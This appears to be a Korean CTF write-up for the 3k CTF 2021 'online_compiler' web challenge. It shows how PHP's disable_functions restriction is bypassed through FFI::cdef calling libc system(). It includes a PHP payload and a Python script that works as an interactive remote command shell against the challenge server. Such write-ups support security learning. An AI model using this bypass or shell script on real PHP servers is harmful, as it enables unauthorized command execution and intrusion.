---
layout: post
date: 2021-05-17 00:00:13
title: "3k CTF 2021 Write Up"
categories: CTF
tags: [RCE, PHP]
author:
  - Jeongwon Jo

---
## (Web) online_compiler [425 pts]

> online_compiler 문제는 disable_functions를 우회하고 플래그를 획득하는 문제입니다.

일단 문제에서 `back-end` 코드와 `php.ini` 파일이 주어지는데 백엔드 코드에서는 그냥 php 코드를 실행할 때 `php.ini` 파일을 기반으로 실행시키는 것만 확인하면 된다. `php.ini` 파일을 확인해보면 `disable_functions`에 의해 많은 함수들이 비활성화 되어 있다. 당연히 `system()`, `exec()`와 같이 쉘 명령어를 실행 할 수 있는 함수들도 비활성화 되어 있다..

![](https://github.com/wjddnjs33/image/blob/main/3kctf%202021/1.png?raw=true)

하지만 `phpinfo()`는 비활성화가 되어 있지 않아 위와 같이 `PHP Version`을 확인할 수 있었고, 7.4.X 버전을 사용 중 이라는 것을 알 수 있었다. 그래서 해당 버전에서 발생하는 취약점들을 찾아보았다.

![](https://github.com/wjddnjs33/image/blob/main/3kctf%202021/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-05-16%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%207.00.45.png?raw=true)
![](https://github.com/wjddnjs33/image/blob/main/3kctf%202021/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-05-17%20%E1%84%8B%E1%85%A9%E1%84%8C%E1%85%A5%E1%86%AB%202.43.32.png?raw=true)

구글링을 하다가 위 내용을 발견했다. 키워드는 `php 7.4 disable_functions bypass`로 검색했는데 위 내용은 `bypass` 항목들 중 하나였다. `phpinfo()`에서 확인을 해보니 활성화가 되어 있는 것을 볼 수 있다.

![](https://github.com/wjddnjs33/image/blob/main/3kctf%202021/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-05-17%20%E1%84%8B%E1%85%A9%E1%84%8C%E1%85%A5%E1%86%AB%202.31.49.png?raw=true)

그래서 5월 16일 오후 7시쯤 진규형님께 보내서 `일단 이게 젤 가능해보이는데`라고 아무 생각 없이 시전을 했다 ㅋㅋ. 씨발 그래도 그 후에 삽질을 2시간 더 했다.

![](https://github.com/wjddnjs33/image/blob/main/3kctf%202021/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-05-17%20%E1%84%8B%E1%85%A9%E1%84%8C%E1%85%A5%E1%86%AB%202.30.48.png?raw=true)

일단 처음 `FFI`를 알아보고 `Foreign function interface`에 약자로 외부 함수 인터페이스인데 이것을 어떻게 활용하는 지 몰랐다. 그러다 신기한 글을 발견 했는데 `FFI` 클래스 내에 `cdef()` 메서드를 이용하는 것을 볼 수 있었다. `cdef()` 인자 값으로는 C 언어 함수 원형을 넣어주면서 객체 하나를 만들고, 해당 객체에서 생성한 함수 원형을 참조해서 외부 함수를 실행시키는 것을 볼 수 있었다.

![](https://github.com/wjddnjs33/image/blob/main/3kctf%202021/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-05-17%20%E1%84%8B%E1%85%A9%E1%84%8C%E1%85%A5%E1%86%AB%202.39.19.png?raw=true)

C Language system() 함수의 원형을 알아보니 위와 같았다. 그냥 `const char command`할 때는 안 됐는더 포인터 변수로 안 해줘서 그런 거 같다.

```php
<?php 
  $ffi=FFI::cdef("int system(const char *command);");
  $ffi->system('ls');
?>
```
그래서 결과적으로 위와 같이 페이로드가 작성됐다. 처음에는 위 사진처럼 라이브러리 파일도 같이 인자로 넘겨주었지만 넘겨주면 잘 되지 않았다. 아마 같은 경로에 파일이 없어서 그런 거 같은데 없이 해줘도 아무 문제 없었다.

![](https://github.com/wjddnjs33/image/blob/main/3kctf%202021/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-05-17%20%E1%84%8B%E1%85%A9%E1%84%8C%E1%85%A5%E1%86%AB%202.50.22.png?raw=true)

파이썬으로 익스 코드를 작성하고, 확인을 해보니 상위 티렉터리에 `El_FlAAG___FilEE` 파일이 존재했다. 그래서 해당 파일을 읽으니 플래그가 나왔다. 결국 아까 오후 7시쯤에 진규 형님께 시전한 게 맞았다. zz

```python
import requests
from pwn import *

url = 'http://onlinecompiler.2021.3k.ctf.to:5000/'
path = ['save', 'compile']

while(1):
    command = raw_input("pocas@py : ")
    c_type, code = 'php', '<?php $ffi=FFI::cdef("int system(const char *command);");$ffi->system(\'{}\');?>'.format(command)
    body1 = {'c_type':c_type, 'code':code}

    # save
    filename = requests.post(url + path[0], data=body1).text
    log.info("Exploitation")
    log.info("filename : " + filename)

    # compile
    body2 = {'c_type':c_type, 'filename':filename}
    result = requests.post(url + path[1], data=body2).text.replace('\n', ' ')
    log.info("result : " + result)
```

> FLAG : 3k{JuSt_A_WaRmUp_O.o}

---
